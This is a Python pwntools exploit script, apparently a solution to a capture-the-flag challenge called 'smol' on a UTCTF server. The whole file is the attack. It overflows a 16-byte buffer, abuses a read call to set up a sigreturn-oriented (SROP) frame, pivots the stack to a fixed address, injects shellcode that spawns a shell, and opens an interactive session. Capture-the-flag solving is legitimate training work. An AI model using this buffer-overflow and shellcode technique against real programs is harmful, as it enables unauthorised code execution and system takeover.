#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./smol')
binary.symbols['main'] = 0x40100d

if args.REMOTE:
	p = remote('pwn.utctf.live', 9998)
else:
	p = process(binary.path)

syscall = next(binary.search(asm('syscall')))
stack = 0x4027f8

frame = SigreturnFrame()
frame.rsp = stack
frame.rip = binary.sym.main

# overflow buffer
# get control of RIP
# call the read function to get 0xf in rax for syscall
# sigret
payload  = b''
payload += 16 * b'A'
payload += p64(binary.sym.main)
payload += p64(syscall)
payload += bytes(frame)

p.send(payload)
time.sleep(.1)

# with read called, get 0xf in rax
p.send(constants.SYS_rt_sigreturn * b'A')
time.sleep(.1)

# new stack that we know address of and its NX
# just put in some shell code and call it
payload  = b''
payload += 16 * b'A'
payload += p64(stack + 8)
payload += asm(shellcraft.sh())

p.send(payload)
p.interactive()
